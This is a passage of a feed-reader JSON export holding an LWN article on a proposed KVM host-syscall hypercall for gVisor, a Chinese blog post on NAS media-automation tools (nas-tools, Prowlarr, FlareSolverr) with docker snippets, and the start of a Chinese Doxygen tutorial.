        "content": "<div>\n           By <b>Jonathan Corbet</b><br>July 29, 2022\n           </div>\nAs a general rule, virtualization mechanisms are designed to provide strong\nisolation between a host and the guest systems that it runs.  The guests\nare not trusted, and their ability to access or influence anything outside\nof their virtual machines must be tightly controlled.  So a patch series\nallowing guests to execute arbitrary system calls in the host context might\nbe expected to be the cause of significantly elevated eyebrows across the\nnet.  Andrei Vagin has posted <a href=\"https://lwn.net/ml/linux-kernel/20220722230241.1944655-1-avagin@google.com/\">such a\nseries</a> with the expected results.\n<p>\nThe use case for Vagin's work is <a href=\"https://gvisor.dev/\">gVisor</a>,\na container-management platform with a focus on security.  Like a full\nvirtualization system, gVisor runs\ncontainers within a virtual machine (using KVM), but the purpose is not to\nfully isolate those containers from the system.  Instead, KVM is used to\nprovide address-space isolation for processes within containers, but the\nresulting virtual machines do not run a normal operating-system kernel.  Instead,\nthey run a special gVisor kernel that handles system calls made by the\ncontained processes, making security decisions as it goes.\n</p><p>\nThat kernel works in an interesting way; it maps\nitself into each virtual machine's address space to match its layout on the\nhost, then switches between the two as needed.  The function to go to the\nvirtual-machine side is called, perhaps inevitably, <tt>bluepill()</tt>.\nThe execution environment is essentially the same on either side, with the\nsame memory layout, but the guest side is constrained by the\nboundaries placed on the virtual machine.\n</p><p>\nMany of the application's system calls can be executed by gVisor within the\nvirtual machine, but some of them must be handled in the less-constrained\ncontext of the host.\nIt certainly works for gVisor to simply perform a\nvirtual-machine exit to have the controlling process on the host side\nexecute the call, then return the result back into the virtual machine, but\nexits are slow.  Performing a lot of exits can badly hurt the performance\nof the workload overall; since part of the purpose of a system like gVisor\nis to provide better performance than pure virtualization, that is seen as\nundesirable.\n</p><p>\nThe proposed solution is to provide a new hypercall (<tt>KVM_HC_HOST_SYSCALL</tt>)\nthat the guest kernel can use to run a system call directly on the host.\nIt takes two parameters: the system-call number and a <tt>pt_regs</tt>\nstructure containing the parameters for that system call.  After executing\nthe call in the host context (without actually exiting from the\nvirtual machine), this hypercall will return the result back to the caller.\nThis interface only works if the guest knows enough about the host's memory\nlayout to provide sensible system-call parameters; in the gVisor case,\nwhere the memory layout is the same on both sides, no special attention is\nrequired. \n\n</p><p>\n\nInternally, this functionality works by way of a new helper called <a href=\"https://lwn.net/ml/linux-kernel/20220722230241.1944655-2-avagin@google.com/\"><tt>do_ksyscall_64()</tt></a>,\nwhich can invoke any system call from within the kernel.  Given that\ninvoking system calls in this way is generally frowned upon, this\nfunctionality seems sure to be a lightning rod for criticism and, indeed,\nThomas Gleixner duly <a href=\"https://lwn.net/ml/linux-kernel/87a68vtvhf.ffs@tglx/\">complained</a>: \"<q>this\nexposes a magic kernel syscall interface to random driver\nwriters. Seriously no</q>\".  While he acknowledged that the series overall\nis \"<q>a clever idea</q>\", he made it clear that exposing system calls in\nthis way was not going to fly.\n</p><p>\nMeanwhile, the ability to invoke host-side system calls directly from a KVM\nguest pokes a major hole in the isolation between virtual \nmachines and the host.  Indeed, the cover letter describes it as \"<q>a\nbackdoor for regular virtual machines</q>\".  Thus, as one would expect,\nthe direct system-call feature is disabled by default; processes that want\nto use it must enable it explicitly when creating a virtual machine.  Most\nhypervisors, it is to be expected, will not do that.\n</p><p>\nThe kernels running deep within companies like Google often contain\nsignificant changes that are not found in the upstream code; this patch set\ngives a hint of what one of those changes looks like:\n</p><p>\n</p><blockquote>\n\tIn the Google kernel, we have a kvm-like subsystem designed\n\tespecially for gVisor. This change is the first step of integrating\n\tit into the KVM code base and making it available to all Linux\n\tusers.\n</blockquote>\n<p>\nThat led Sean Christopherson to <a href=\"https://lwn.net/ml/linux-kernel/Yts1tUfPxdPH5XGs@google.com/\">ask</a> about what the\nfollowing steps would be.  \"<q>It's practically impossible to review this\nseries without first understanding the bigger picture</q>\".  Merging this\nfirst step could be a mistake if the following steps turn out not to be\nacceptable; at that point, the kernel community could find itself\nsupporting a partial feature that is not actually being used.  As it turns\nout, Vagin <a href=\"https://lwn.net/ml/linux-kernel/CAEWA0a4hrRb5HYLqa1Q47=guY6TLsWSJ_zxNjOXXV2jCjUekUA@mail.gmail.com/\">said</a>,\nthis is the \nonly feature that is needed.  gVisor works on top of KVM now, he said; the\ncurrent patch series just improves its performance.\n</p><p>\nChristopherson also asked about alternatives, noting that \"<q>making\narbitrary syscalls from within KVM is mildly terrifying</q>\".  Vagin\nprovided a few, starting with the current scheme where a virtual-machine\nexit is used to (slowly) handle each system call.\nAnother approach is to run <i>all</i> of gVisor on the host side, exiting from the\nvirtual machine for every system call.  Executing a system call in this\nmode takes about 2.1µs; the direct system-call mechanism reduces that to\nabout 1.0µs.  Or gVisor could use BPF to handle the system calls; that\nprovides similar performance, Vagin said, but would require some\nquestionable changes, like providing BPF programs with the ability to\ninvoke arbitrary system calls.  Yet another possibility is to use the\nonce-proposed <a href=\"https://lwn.net/Articles/852662/\"><tt>process_vm_exec()</tt> system\ncall</a>, but that can perform poorly in some situations.\n</p><p>\nKVM maintainer Paolo Bonzini <a href=\"https://lwn.net/ml/linux-kernel/69b45487-ce0e-d643-6c48-03c5943ce2e6@redhat.com/\">said</a>\nthat his largest objection is the lack of address translation between the\nguest and the host.  In its current form, this mechanism depends on the\nmemory layout being the same on both sides; otherwise any addresses in an\nargument to a system call would not make sense on the host side.  As a\nresult, the new mechanism is highly specialized for gVisor and seems\nunlikely to be more widely useful.  It is not clear that everybody sees\nthat specialization as a disadvantage, though.\n</p><p>\nAll told, gVisor in this mode represents an interesting shift in the\nsecurity boundary between a host and the containers it runs.  Much of the\nsecurity depends on code that is within the virtual machine, with the host\nside trusting that code at a fairly deep level.  It is a different view of\nhow virtualization with KVM is meant to work, but it seems that the result\nworks well — within Google at least.  Whether this mechanism will make it\ninto the mainline remains an open question, though.  Making holes in the\nwall between host and guest is not something to be done lightly, so the\ndevelopers involved are likely to want to be sure that no better\nalternatives exist.<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Virtualization-KVM\">Virtualization/KVM</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "https://blog.17lai.site/posts/db7bf49b/",
    "timestampUsec": "1659194916282524",
    "categories": [
        "pt",
        "nas",
        "docker",
        "emby",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "视频图书和音乐完全自动化管理框架图解",
    "author": "",
    "published": 1652067420,
    "updated": 1652067420,
    "alternate": [
        {
            "href": "https://blog.17lai.site/posts/db7bf49b/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<blockquote>\n<p>音视频，音乐和图书管理全过程自动化解决方案框架图解！结构化你的音视频、音乐和图书资源。所有过程一张图搞定！</p>\n</blockquote>\n<span></span>\n<h2>框架自动化构架图解</h2>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/09/20220509113832.webp\" alt=\"自动化框架构架\"></p>\n<h2>相关文章</h2>\n<div>\n\n    \n        <a href=\"https://blog.17lai.site/posts/2b9325d0/\"><img src=\"https://blog.17lai.site/medias_webp/cover/music.webp\"></a>\n    \n    <div>\n        <a href=\"https://blog.17lai.site/posts/2b9325d0/\">私人在线音乐服务器搭建与使用介绍</a>\n        <hr>\n        <div>私人在线音乐服务器搭建与使用介绍！Mstream Docker 部署， rclone 挂载 webdav 网盘。 cloudflare parterner加速。</div>\n    </div>\n</div>\n<div>\n\n    \n        <a href=\"https://blog.17lai.site/posts/9912bd5d/\"><img src=\"https://blog.17lai.site/medias_webp/cover/emby.webp\"></a>\n    \n    <div>\n        <a href=\"https://blog.17lai.site/posts/9912bd5d/\">使用jeckett,sonarr,iyuu,qt,emby打造全自动追剧流程</a>\n        <hr>\n        <div>jackett 作为种子源，sonarr剧集管理，bt下载，qbittorrent主力下载，使用iyuu转移辅种，emby，jellyfin做海报墙，sunfinder自动下载字幕。基本算是完美打通全流程自动追剧。bt种子文件命名规则SxxExx的自动识别下载，国内的资源手动查找下载，自动推送到emby刮削好。结合本地DNS管理，DNS去广告，Nginx 反向代理去端口访问，形成一个完整解决方案。</div>\n    </div>\n</div>\n<h2>图书、音乐、视频三剑客！</h2>\n<blockquote>\n<p>结构化自己的图书，音乐，和视频！</p>\n</blockquote>\n<div>\n\n    \n        <a href=\"https://blog.17lai.site/posts/dc1c8194/\"><img src=\"https://blog.17lai.site/medias_webp/cover/book.webp\"></a>\n    \n    <div>\n        <a href=\"https://blog.17lai.site/posts/dc1c8194/\">如何建立自己的私人图书馆</a>\n        <hr>\n        <div>图书管理员似乎是个非常有前途的职业，远的有孔子，游学之前当图书管理员，近的有本朝开国毛教员，也当了很长时间图书管理员。我们也可以自己做个私人电子图书馆，单个管理员，说不定很有前途？</div>\n    </div>\n</div>\n<div>\n\n    \n        <a href=\"https://blog.17lai.site/posts/3847ad58/\"><img src=\"https://blog.17lai.site/medias_webp/cover/music.webp\"></a>\n    \n    <div>\n        <a href=\"https://blog.17lai.site/posts/3847ad58/\">如何使用media Go,MusicBrainz,Mp3tag工具刮削音乐 整理音乐资料库</a>\n        <hr>\n        <div>音乐文件则是将歌名、歌手、专辑、发行时间、歌词、封面图等信息写入文件标签，称为ID3 Tag 。它能够在MP3中附加曲子的演出者、作者以及其它类别资讯，方便众多乐曲的管理。</div>\n    </div>\n</div>\n<div>\n\n    \n        <a href=\"https://blog.17lai.site/posts/e6d40157/\"><img src=\"https://blog.17lai.site/medias_webp/cover/emby.webp\"></a>\n    \n    <div>\n        <a href=\"https://blog.17lai.site/posts/e6d40157/\">如何使用tinyMediaManager刮削电影和电视剧，动画，并自动下载字幕</a>\n        <hr>\n        <div>tinyMediaManager是最好用的视频刮削工具，可以刮削电影，动画，电视剧。使用TinyMediaManager生成nfo元数据文件，多媒体软件解析生成海报墙展示丰富的影片信息，配合Emby，Plex使用体验绝佳</div>\n    </div>\n</div>\n<h2>相关资源</h2>\n<blockquote>\n<p>更多相关资源可以到下面网址查看</p>\n<ul>\n<li><a target=\"_blank\" rel=\"noopener\" href=\"https://hub.docker.com/repositories\">DockerHub</a></li>\n<li><a target=\"_blank\" rel=\"noopener\" href=\"https://github.com/appotry\">Github</a></li>\n</ul>\n</blockquote>\n<h3>nas-tools</h3>\n<blockquote>\n<ul>\n<li><a target=\"_blank\" rel=\"noopener\" href=\"https://github.com/jxxghp/nas-tools\">nas-tools Github</a></li>\n<li><a target=\"_blank\" rel=\"noopener\" href=\"https://hub.docker.com/repository/docker/jxxghp/nas-tools\">nas-tools DockerHub</a></li>\n</ul>\n</blockquote>\n<p>推荐一下这个，作者相当勤奋，更新速度非常快！最重要的是它是国人开发，对中文支持很好！有问题提Issue，作者回复也很快！</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/09/20220509115933.webp\" alt=\"nas-tools\"></p>\n<h4>功能：</h4>\n<h5>1、资源检索</h5>\n<ul>\n<li>PT站聚合<code>RSS</code>订阅，实现资源自动追新。</li>\n<li>通过微信、Telegram或者WEB界面聚合检索资源并择优，最新热门一键搜索或者订阅。</li>\n<li>在豆瓣中标记，后台自动检索，未出全的自动加入<code>RSS</code>追更。</li>\n</ul>\n<h5>2、媒体识别和重命名</h5>\n<ul>\n<li>监控下载软件，下载完成后自动识别真实名称，硬链接到媒体库并重命名。</li>\n<li>对目录进行监控，文件变化时自动识别媒体信息硬链接到媒体库并重命名。</li>\n<li>支持国产剧集，支持动漫，改名后<code>Emby/Jellyfin/Plex</code> 100%搜刮。</li>\n</ul>\n<h5>3、消息服务</h5>\n<ul>\n<li>支持<code>ServerChan</code>、微信、<code>Telegram</code>、<code>Bark</code>等图文消息通知，直接在手机上控制。</li>\n</ul>\n<h5>4、其它</h5>\n<ul>\n<li>自动签到、<code>Emby/Jellyfin/Plex</code>播放状态通知等等。</li>\n</ul>\n<h4>安装</h4>\n<pre data-language=\"yaml\"><code><span>version</span><span>:</span> <span>\"3.4\"</span>\n<span>services</span><span>:</span>\n  <span>nastools</span><span>:</span>\n    <span>image</span><span>:</span> jxxghp/nas<span>-</span>tools<span>:</span>latest\n    <span>container_name</span><span>:</span> nastools\n    <span>hostname</span><span>:</span> nastools\n    <span># ports:</span>\n      <span># - 3000:3000        # 默认的webui控制端口</span>\n    <span>volumes</span><span>:</span>\n      <span>-</span> $<span>{</span>USERDIR<span>}</span>/nastools/config<span>:</span>/config   <span># 冒号左边请修改为你想保存配置的路径</span>\n      <span>-</span> $<span>{</span>USERDIR<span>}</span>/<span>[</span>path<span>]</span>/Download<span>:</span>/share/Download\n      <span>#- /你的媒体目录:/你想设置的容器内能见到的目录   # 媒体目录，多个目录需要分别映射进来</span>\n    <span>environment</span><span>:</span>\n      <span>-</span> PUID=$<span>{</span>PUID<span>}</span>\n      <span>-</span> PGID=$<span>{</span>PGID<span>}</span>\n      <span>-</span> TZ=$<span>{</span>TZ<span>}</span>\n      <span>-</span> UMASK=022 <span># 掩码权限，默认000，可以考虑设置为022</span>\n     <span>#- REPO_URL=https://ghproxy.com/https://github.com/jxxghp/nas-tools.git  </span>\n    <span>restart</span><span>:</span> always <span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4>参数配置</h4>\n<p>新版参数基本都可以在web界面配置。</p>\n<p>也可以直接修改配置文件，配置文件中有非常详细的注释！请认真查看配置文件中的文本注释！</p>\n<p>配置文件位置，基于docker路径<code>/config/config.yaml</code></p>\n<p>配置文件模板，可以仓库下面链接文件</p>\n<p><code>https://github.com/jxxghp/nas-tools/blob/master/config/config.yaml</code></p>\n<h3>硬链接工具</h3>\n<blockquote>\n<ul>\n<li><strong><a target=\"_blank\" rel=\"noopener\" href=\"https://github.com/appotry/PTtool\">Github appotry/PTtool</a></strong></li>\n</ul>\n</blockquote>\n<h3>nginx docker</h3>\n<blockquote>\n<ul>\n<li><strong><a target=\"_blank\" rel=\"noopener\" href=\"https://github.com/appotry\">Github appotry</a>/<a target=\"_blank\" rel=\"noopener\" href=\"https://github.com/appotry/nginx-purge-docker\">nginx-purge-docker</a></strong></li>\n<li><a target=\"_blank\" rel=\"noopener\" href=\"https://hub.docker.com/repository/docker/bloodstar/nginx-purge\">nginx DockerHub</a></li>\n</ul>\n</blockquote>\n<h3>prowlarr</h3>\n<blockquote>\n<p>最早是玩<code>sonarr</code>、<code>radarr</code>，然后找到i相关的全家桶，见下图</p>\n</blockquote>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/09/20220509122743.webp\" alt=\"prowlarr\"></p>\n<blockquote>\n<p>发现各种资源，结构化，<code>Github</code>上面都有很完善的解决方案，但大都对中文支持不好。而且各种上下游资源也是越来越丰富，看看<code>prowlarr</code>支持的<code>app</code>，基本覆盖你的所有所需！<code>Whisparr</code>项目的介绍惊呆了我😄</p>\n<p>国人也有一些好项目，<code> IYUU</code>，<code>nas-tools</code>等。</p>\n</blockquote>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/09/20220509122740.webp\" alt=\"prowlarr\"></p>\n<h3><a target=\"_blank\" rel=\"noopener\" href=\"https://github.com/FlareSolverr/FlareSolverr\">FlareSolverr</a></h3>\n<pre data-language=\"bash\"><code><span>docker</span> run -d <span>\\</span>\n  --name<span>=</span>flaresolverr <span>\\</span>\n  -p <span>8191</span>:8191 <span>\\</span>\n  -e <span>LOG_LEVEL</span><span>=</span>info <span>\\</span>\n  --restart unless-stopped <span>\\</span>\n  ghcr.io/flaresolverr/flaresolverr:latest<span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>如果成功启动，访问<code>ip:8191</code>将看到如下信息</p>\n<pre data-language=\"json\"><code><span>{</span>\n<span>\"msg\"</span><span>:</span> <span>\"FlareSolverr is ready!\"</span><span>,</span>\n<span>\"version\"</span><span>:</span> <span>\"v2.2.4\"</span><span>,</span>\n<span>\"userAgent\"</span><span>:</span> <span>\"Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0\"</span>\n<span>}</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n"
    },
    "origin": {
        "streamId": 34,
        "title": "夜法之书",
        "htmlUrl": "https://blog.17lai.site/",
        "feedUrl": "https://blog.17lai.site/atom.xml"
    }
},
{
    "id": "https://blog.17lai.site/posts/1acb0edb/",
    "timestampUsec": "1659194916282526",
    "categories": [
        "tools",
        "doxygen",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Doxygen入门教程",
    "author": "",
    "published": 1653741000,
    "updated": 1653741000,
    "alternate": [
        {
            "href": "https://blog.17lai.site/posts/1acb0edb/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<blockquote>\n<p>Doxygen是API文档生成工具，可以根据代码注释生成文档的工具。支持HTML、CHM、PDF等格式。主要支持C语言、Python语言，其它C语系语言也支持（如C++、Java、C#等）。</p>\n</blockquote>\n<span></span>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211032.webp\" alt=\"Doxygen效果演示\"></p>\n<p>本教程的测试环境</p>\n<ul>\n<li>Ubuntu 18.04 LTS</li>\n<li>Doxygen 1.8.13</li>\n<li>C++</li>\n<li>Gitlab CI/CD</li>\n<li>windows</li>\n</ul>\n<h2>什么是 Doxygen？</h2>\n<p>Doxygen 是一个将文件的特定注释转化为文档的工具</p>\n<h2>如何安装 Doxygen？</h2>\n<pre data-language=\"bash\"><code>$ <span>sudo</span> <span>apt</span> <span>install</span> graphviz\n$ <span>sudo</span> <span>apt</span> <span>install</span> doxygen<span aria-hidden=\"true\"><span></span><span></span></span></code></pre>\n<h2>如何使用 Doxygen？</h2>\n<p><strong>1. 查看你使用的语言 Doxygen 是否默认支持？</strong></p>\n<p>Doxygen 默认支持的语言有：C，C++，C#，Objective-C，IDL，Java，VHDL，PHP，Python，Tcl，Fortran 和 D</p>\n<p><strong>2. 生成配置文件</strong></p>\n<pre data-language=\"bash\"><code>$ <span>## 生成配置文件，默认配置文件名为：Doxyfile</span>\n$ doxygen -g   <span>&lt;</span>config-file<span>&gt;</span>\n$\n$ <span>## 生成配置文件（不含注释）</span>\n$ doxygen -s -g <span>&lt;</span>config-file<span>&gt;</span>\n$<span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>3. 修改配置文件</strong></p>\n<pre data-language=\"makefile\"><code><span>## 常见配置选项</span>\n\n<span>## 设置项目编码，默认为 UTF-8</span>\nDOXYFILE_ENCODING <span>=</span> UTF-8\n\n<span>## 设置项目名称</span>\nPROJECT_NAME <span>=</span> <span>\"project-name\"</span>\n\n<span>## 设置项目版本号</span>\nPROJECT_NUMBER <span>=</span> <span>\"1.0.0\"</span>\n\n<span>## 设置项目的描述</span>\nPROJECT_BRIEF <span>=</span> <span>\"这是项目描述\"</span>\n\n<span>## 设置项目的 logo </span>\nPROJECT_LOGO <span>=</span> <span>\"\"</span>\n\n<span>## 设置输入目录，如果未设置，则在当前目录查找</span>\nINPUT <span>=</span> src\n\n<span>## 设置要匹配的输入文件</span>\nFILE_PATTERNS <span>=</span> *.cc *.h\n\n<span>## 设置不需要处理的输入目录</span>\nEXCLUDE <span>=</span>\n\n<span>## 设置不需要匹配的输入文件</span>\nEXCLUDE_PATTERNS <span>=</span>\n\n<span>## 设置输入编码，默认为 UTF-8</span>\nINPUT_ENCODING <span>=</span> UTF-8\n\n<span>## 设置是否递归搜索输入目录，默认为 NO</span>\nRECURSIVE <span>=</span> NO\n\n<span>## 设置是否提取所有类，函数等（不包括类的私有成员和静态成员），默认为 NO</span>\nEXTRACT_ALL <span>=</span> NO\n\n<span>## 设置是否提取类的私有成员，默认为 NO</span>\nEXTRACT_PRIVATE <span>=</span> NO\n\n<span>## 设置是否提取类的静态成员，默认为 NO</span>\nEXTRACT_STATIC <span>=</span> NO\n\n<span>## 设置文档是否包含源文件，默认为 NO</span>\nSOURCE_BROWSER <span>=</span> NO\n\n<span>## 设置是否对每个类都链接到其所在的头文件中，默认值为 YES</span>\nVERBATIM_HEADERS <span>=</span> YES\n\n<span>## 设置文档的输出目录</span>\nOUTPUT_DIRECTORY <span>=</span> doc\n\n<span>## 设置是否支持 Markdown，默认值为 YES</span>\nMARKDOWN_SUPPORT <span>=</span> YES\n\n<span>## 设置文档的主界面</span>\nUSE_MDFILE_AS_MAINPAGE <span>=</span>\n\n<span>## 设置文档的语言，默认为 English</span>\nOUTPUT_LANGUAGE <span>=</span> Chinese         <span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>4. 给代码添加注释</strong><br>\n并不是所有的注释都会被收入文档，Doxygen 支持的常用的注释风格有：</p>\n<pre data-language=\"c\"><code><span>/**     注释的内容       */</span>\n<span>/*!     注释的内容       */</span>\n\n## 在变量后 注释文件，类，结构体，共同体，枚举成员 或 函数参数\n<span>int</span> a<span>;</span> <span>/**&lt;      注释的内容        */</span>\n<span>int</span> a<span>;</span> <span>/*!&lt;      注释的内容        */</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>注意：</strong> 这里并不是所有的注释风格，更多注释风格见 <a target=\"_blank\" rel=\"noopener\" href=\"http://doxygen.nl/manual/docblocks.html\">官网</a></p>\n<p>Doxygen 常用的注释标记（标记以 / 或 @ 开头表示）：</p>\n<pre data-language=\"makefile\"><code><span>## 添加作者</span>\n<span>@</span>author 作者1 作者2\n\n<span>## 添加日期</span>\n<span>@</span>date 日期\n\n<span>## 添加文件名</span>\n<span>@</span>file 文件名\n\n<span>## 添加简单描述</span>\n<span>@</span>brief 简要描述\n\n<span>## 添加详细描述</span>\n<span>@</span>details 详细描述\n\n<span>## 添加类信息</span>\n<span>@</span>class 类名 类所在的文件 类所在的文件（可包括路径） \n\n<span>## 添加结构体信息</span>\n<span>@</span>class 结构体名 结构体所在的文件 结构体所在的文件（可包括路径）\n\n<span>## 添加宏信息</span>\n<span>@</span>enum 宏名\n\n<span>## 添加函数信息</span>\n<span>@</span>fn 函数信息\n\n<span>## 添加参数说明</span>\n<span>@</span>param [in]   输入参数名 说明\n<span>@</span>param [out] 输出参数名 说明\n\n<span>## 添加返回说明</span>\n<span>@</span>return 返回说明\n\n<span>## 添加返回特定值说明</span>\n<span>@</span>retval 特定值 特定返回值说明\n\n<span>## 添加异常说明</span>\n<span>@</span>exception 异常类型 异常说明\n\n<span>## 添加代码</span>\n<span>@</span>code\n...代码...\n<span>@</span>encode\n\n<span>## 添加文件名说明</span>\n<span>@</span>headfile 文件名 文件名（可包括路径） \n\n<span>## 添加版本号</span>\n<span>@</span>version 版本号\n\n<span>## 添加计划做的事儿</span>\n<span>@</span>todo 计划做的事\n\n<span>## 添加参考 </span>\n<span>@</span>see 参加其它\n\n<span>## 添加过时说明</span>\n<span>@</span>deprecated 过时说明\n\n<span>## 添加 bug 说明</span>\n<span>@</span>bug <span>\"bug 说明\"</span>\n\n<span>## 添加例子</span>\n<span>@</span>example 例子文件名\n\n<span>## 添加警告信息</span>\n<span>@</span>warning 警告信息\n\n<span>## 添加开始使用的版本</span>\n<span>@</span>since 版本\n\n<span>## 添加测试信息</span>\n<span>@</span>test 测试\n\n<span>## 添加主界面信息</span>\n<span>@</span>mainpage 标题\n\n<span>## 添加注意事项 </span>\n<span>@</span>note 注意事项\n\n<span>## 添加协议信息</span>\n<span>@</span>copyright 协议信息<span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3>为C/C++添加注释</h3>\n<p>首先为函数添加注释信息，这是必须要做的。这里有个选择性问题，添加到哪里呢？.c文件？.h文件？</p>\n<p>一般来说：</p>\n<ul>\n<li>.h文件代表模块对外的接口最小信息，面向模块使用者</li>\n<li>.c文件代表模块的实现代码，面向的是开发者</li>\n</ul>\n<p>在实际编程中，事先约定各个模块间的接口，然后将不同的模块分配给不同的开发者，与此同时，测试人员根据接口要求，编写测试代码，这就完全保证了并发编程和白盒测试要求。</p>\n<p>这里我们可以看到，文档主要是用来描述接口信息的，所以，我对代码的注释规定如下：</p>\n<ul>\n<li>模块对外接口，仅在.h中提供注释信息</li>\n<li>模块内部辅助函数，全部用static设为私有函数，同时仅在.c中保留注释信息</li>\n</ul>\n<p>当然，您也可以同时为.c .h的接口函数编写两份完全一样的注释信息，但这么做，您会同时维护两份信息，出错的概率会更大些。</p>\n<p>确定了注释位置，下一步考虑一个函数需要哪些信息</p>\n<p>一般来说，需要函数功能，入口参数，返回值，注意事项，某些时候还需要说明上下文环境，从而保证函数能正确执行</p>\n<p>比如这个函数</p>\n<pre data-language=\"c\"><code><span>extern</span> <span>int</span> <span>Dev_PrintInt</span><span>(</span><span>int</span> number<span>)</span><span>;</span> <span aria-hidden=\"true\"><span></span></span></code></pre>\n<p>它的功能就是打印一个整形数据，传入参数为整数，返回的是成功打印的数据长度（字节为单位），同时呢，我们在调用这个函数之前，必须要先初始化Dev设备</p>\n<p>ok，这就是所有接口信息，稍微规范一下，就变成了下面的样子</p>\n<pre data-language=\"c\"><code><span>// 函数功能：打印整数</span>\n<span>// 入口参数：number为一个整数类型</span>\n<span>// 返回结构：返回的是成功打印的数据长度（字节为单位）</span>\n<span>// 注意事项：</span>\n<span>//          1：在调用本函数前，请确保已经调用Dev_Init初始化设备</span>\n<span>//          2：请注意函数返回值，如果该值为0，则说明函数执行失败</span>\n\n<span>extern</span> <span>int</span> <span>Dev_PrintInt</span><span>(</span><span>int</span> number<span>)</span><span>;</span> <span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>用英文来书写呢，则变成下面的样子</p>\n<pre data-language=\"c\"><code><span>//***************************************************************************************</span>\n<span>//</span>\n<span>// brief  : Print Int number to terimal device.</span>\n<span>//</span>\n<span>// param  : number is the data you want to print.</span>\n<span>// retval : the number of print information, in bytes. return zero indicate print error !</span>\n<span>//</span>\n<span>// Note:</span>\n<span>//      * Be sure you have called \\ref Dev_Init function before call this fuction.</span>\n<span>//      * Remember to check return value.</span>\n<span>//</span>\n<span>//***************************************************************************************</span>\n<span>extern</span> <span>int</span> <span>Dev_PrintInt</span><span>(</span><span>int</span> number<span>)</span><span>;</span><span aria-hidden=\"true\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>注释信息写完了，一般来说，函数能达到这种信息程度就ok了，但既然要生成文档，就不得不考虑一个问题</p>\n<p>如果你是Doxygen作者，怎么从上面的注释里面提取信息呢，信息那么多，有<code>*</code>号，有各种文字信息。</p>\n<p>你可以将所有的注释信息都输出出来，但这么做，等于没有分类整理，同时也包含了杂乱信息，比如一排<code>*</code></p>\n<p>另外一个解决方法是：设置某些特殊字符，比如<code>function</code>表示，一旦检测到这个特殊标记，则认为是接下来<br>\n的一行是函数功能描述。但这么做，万一用户的注释里面出现很多个function，你怎么识别哪个是普通文本，<br>\n哪个是特殊标记？</p>\n<p>也许你会说了，可以采用<img src=\"https://math.now.sh/?inline=FUNCTION\">这种形式啊，恩，这么做是可行的，可以确保识别出来特殊标记</p>\n<p>接下来，还有一个问题，我们上面的注释中，有很多<code>*</code>号，仅仅起到美观和格式化的作用，当然不希望在<br>\n输出文档中显示这些东西，问题是你怎么识别这些符号，并不显示呢？也许你会说，可以强制规定注释的<br>\n格式，不让用户在代码中写很多<code>*</code>，ok，假设用户同意这么做。那接下来呢，如果我希望在代码中写某些话<br>\n，但是不希望输出到文档中，比如“XX是2B”等等，你又该怎么做呢？</p>\n<p>正向思考遇到问题时，不妨反向考虑，这是谁的问题：是我设计思路的问题还是用户用法的问题？</p>\n<p>困难重重，肯定是设计思路的问题</p>\n<p>如果设计一个标记符，将普通注释和要生成的文档注释区分开来，就能解决问题了。</p>\n<p>Doxygen的用法，说白了，就是为了解决上面提到的两个问题：</p>\n<pre><code>怎么区分普通注释和输出注释  \n怎么在输出注释里面，识别特殊标记和普通文本  <span 